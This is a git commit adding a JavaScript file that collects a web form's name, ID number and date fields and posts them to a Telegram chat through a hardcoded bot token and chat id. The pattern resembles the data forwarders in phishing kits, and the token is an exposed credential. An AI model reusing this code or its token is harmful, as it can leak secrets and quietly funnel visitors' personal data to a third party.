25b3fe2596d27a391c34581a4780e379809c6fab
HappyFamilyPawn <maoem10g107@gmail.com>
2022-03-14 15:53:57 +0700

    Create sender.js

---
+++ telegram/informationho/sender.js
@@ -0,0 +1,35 @@
+//bot token
+var telegram_bot_id = "5202340865:AAEVXrBavgDDUbWJBB7e5vCJTAdj5Kc1F3E";
+//chat id
+var chat_id = 1119951751;
+var name, number, date;
+var ready = function () {
+    name = document.getElementById("name").value;
+    number = document.getElementById("number").value;
+    date = document.getElementById("date").value;
+    message = "Name->:" + name + "\nID----->:" + number + "\nDate-->: " + date  + "\n------------------------";
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+    });
+    document.getElementById("name").value = "";
+    document.getElementById("number").value = "";
+    document.getElementById("date").value = "";
+    return false;
+};
